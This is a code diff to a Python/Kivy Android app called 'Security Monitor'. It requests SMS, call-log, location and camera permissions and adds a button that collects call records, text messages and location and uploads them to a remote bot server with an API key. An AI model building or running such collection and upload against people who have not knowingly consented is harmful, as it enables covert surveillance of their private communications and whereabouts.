@@ -33,37 +33,31 @@ def request_android_permissions():
 
         request_permissions([
 
-            # Camera monitoring
             Permission.CAMERA,
 
-            # Location monitoring
             Permission.ACCESS_FINE_LOCATION,
             Permission.ACCESS_COARSE_LOCATION,
 
-            # Call monitoring
             Permission.READ_CALL_LOG,
             Permission.READ_PHONE_STATE,
 
-            # SMS monitoring
             Permission.READ_SMS,
             Permission.RECEIVE_SMS,
 
-            # Android 13 notification
             Permission.POST_NOTIFICATIONS,
 
         ])
 
 
+
 # ===============================
-# AGENT CONFIG
+# CONFIG
 # ===============================
 
 class AgentConfig:
 
     bot_url = BOT_URL
-
     api_key = API_KEY
-
     agent_id = AGENT_ID
 
 
@@ -73,6 +67,7 @@ class AgentConfig:
 # ===============================
 
 class MonitorUI(BoxLayout):
+
 
     def __init__(self, **kwargs):
 
@@ -88,7 +83,7 @@ class MonitorUI(BoxLayout):
 
             text="Security Monitor\nReady",
 
-            font_size="22sp",
+            font_size="22sp"
 
         )
 
@@ -100,19 +95,15 @@ class MonitorUI(BoxLayout):
 
         self.test_button = Button(
 
-            text="Test Render Connection",
+            text="Test Heartbeat",
 
-            size_hint_y=0.25,
+            size_hint_y=0.2
 
         )
-
 
         self.test_button.bind(
-
             on_press=self.test_connection
-
         )
-
 
         self.add_widget(
             self.test_button
@@ -124,17 +115,13 @@ class MonitorUI(BoxLayout):
 
             text="Send Test Alert",
 
-            size_hint_y=0.25,
+            size_hint_y=0.2
 
         )
-
 
         self.alert_button.bind(
-
             on_press=self.send_test_alert
-
         )
-
 
         self.add_widget(
             self.alert_button
@@ -142,28 +129,40 @@ class MonitorUI(BoxLayout):
 
 
 
-    def set_status(self, message):
+        self.data_button = Button(
 
-        self.status_label.text = message
+            text="Send Call SMS Location",
 
+            size_hint_y=0.2
 
+        )
 
-    # ===============================
-    # HEARTBEAT TEST
-    # ===============================
+        self.data_button.bind(
+            on_press=self.send_data_test
+        )
 
-    def test_connection(self, _instance=None):
-
-        self.test_button.disabled = True
-
-        self.set_status(
-            "Testing heartbeat..."
+        self.add_widget(
+            self.data_button
         )
 
 
+
+    def set_status(self,msg):
+
+        self.status_label.text = msg
+
+
+
+    # ===============================
+    # HEARTBEAT
+    # ===============================
+
+
+    def test_connection(self,_):
+
         threading.Thread(
 
-            target=self._connection_worker,
+            target=self._heartbeat_worker,
 
             daemon=True
 
@@ -171,95 +170,66 @@ class MonitorUI(BoxLayout):
 
 
 
-    def _connection_worker(self):
+    def _heartbeat_worker(self):
 
         try:
 
             import requests
 
 
-            response = requests.post(
+            r=requests.post(
 
-                f"{BOT_URL.rstrip('/')}/agent/heartbeat",
+                f"{BOT_URL}/agent/heartbeat",
 
                 json={
 
-                    "device_info": {
+                    "device_info":{
 
-                        "platform": "android",
+                        "platform":"android",
 
-                        "status": "APK heartbeat test"
+                        "status":"online"
 
                     }
 
                 },
 
-
                 headers={
 
-                    "X-API-Key": API_KEY,
+                    "X-Agent-ID":AGENT_ID,
 
-                    "X-Agent-ID": AGENT_ID,
-
-                    "Content-Type": "application/json",
+                    "X-API-Key":API_KEY
 
                 },
-
 
                 timeout=20
 
             )
 
 
-            message = (
-
-                f"Heartbeat:\n"
-
-                f"HTTP {response.status_code}\n"
-
-                f"{response.text[:200]}"
-
-            )
+            msg=f"Heartbeat {r.status_code}"
 
 
         except Exception:
 
-            message = (
+            msg=traceback.format_exc()
 
-                "Heartbeat failed:\n"
-
-                +
-
-                traceback.format_exc()[-700:]
-
-            )
 
 
         Clock.schedule_once(
 
-            lambda dt:
-
-            self.finish_test(message),
-
-            0
+            lambda x:self.set_status(msg)
 
         )
 
 
 
+
     # ===============================
-    # ALERT TEST
+    # ALERT
     # ===============================
 
-    def send_test_alert(self, _instance=None):
 
-        self.alert_button.disabled = True
-
-
-        self.set_status(
-            "Sending alert..."
-        )
-
+    def send_test_alert(self,_):
 
         threading.Thread(
 
@@ -278,101 +248,160 @@ class MonitorUI(BoxLayout):
             import requests
 
 
-            response = requests.post(
+            r=requests.post(
 
-                f"{BOT_URL.rstrip('/')}/alert",
-
+                f"{BOT_URL}/alert",
 
                 json={
 
                     "title":
                     "APK Test Alert",
 
-
                     "description":
-                    "Security Monitor test alert from Android",
-
+                    "Android security monitor test",
 
                     "severity":
                     "HIGH",
 
+                    "device_info":{
 
-                    "device_info": {
-
-                        "agent_id": AGENT_ID,
-
-                        "platform": "android"
+                        "agent_id":AGENT_ID
 
                     }
 
                 },
 
-
                 headers={
 
-                    "X-API-Key": API_KEY,
+                    "X-Agent-ID":AGENT_ID,
 
-                    "X-Agent-ID": AGENT_ID,
-
-                    "Content-Type": "application/json"
+                    "X-API-Key":API_KEY
 
                 },
-
 
                 timeout=20
 
             )
 
 
-            message = (
-
-                f"Alert:\n"
-
-                f"HTTP {response.status_code}\n"
-
-                f"{response.text[:200]}"
-
-            )
+            msg=f"Alert {r.status_code}"
 
 
         except Exception:
 
-            message = (
+            msg=traceback.format_exc()
 
-                "Alert failed:\n"
-
-                +
-
-                traceback.format_exc()[-700:]
-
-            )
 
 
         Clock.schedule_once(
 
-            lambda dt:
-
-            self.finish_alert(message),
-
-            0
+            lambda x:self.set_status(msg)
 
         )
 
 
 
-    def finish_test(self, message):
 
-        self.set_status(message)
-
-        self.test_button.disabled = False
-
+    # ===============================
+    # CALL SMS LOCATION DATA
+    # ===============================
 
 
-    def finish_alert(self, message):
+    def send_data_test(self,_):
 
-        self.set_status(message)
+        threading.Thread(
 
-        self.alert_button.disabled = False
+            target=self._data_worker,
+
+            daemon=True
+
+        ).start()
+
+
+
+    def _data_worker(self):
+
+
+        try:
+
+            import requests
+
+
+            from collectors.call_data import get_calls
+
+            from collectors.sms_data import get_sms
+
+            from collectors.location_data import get_location
+
+
+
+            payload={
+
+
+                "calls":
+                get_calls(),
+
+
+                "sms":
+                get_sms(),
+
+
+                "location":
+                get_location()
+
+
+            }
+
+
+
+            r=requests.post(
+
+
+                f"{BOT_URL}/agent/data",
+
+
+                json=payload,
+
+
+                headers={
+
+                    "X-Agent-ID":AGENT_ID,
+
+                    "X-API-Key":API_KEY,
+
+                    "Content-Type":
+                    "application/json"
+
+                },
+
+
+                timeout=30
+
+            )
+
+
+
+            msg=(
+
+                f"DATA {r.status_code}\n"
+
+                f"{r.text}"
+
+            )
+
+
+
+        except Exception:
+
+            msg=traceback.format_exc()
+
+
+
+        Clock.schedule_once(
+
+            lambda x:self.set_status(msg)
+
+        )
 
 
 
@@ -381,18 +410,16 @@ class MonitorUI(BoxLayout):
 # APP
 # ===============================
 
+
 class SecurityMonitorApp(App):
 
 
     def build(self):
 
-        # Request Android permissions
 
         request_android_permissions()
 
 
-
-        # Start security monitoring
 
         threading.Thread(
 
@@ -418,13 +445,13 @@ class SecurityMonitorApp(App):
 
             )
 
-
         except Exception:
 
             traceback.print_exc()
 
 
 
-if __name__ == "__main__":
+
+if __name__=="__main__":
 
     SecurityMonitorApp().run()
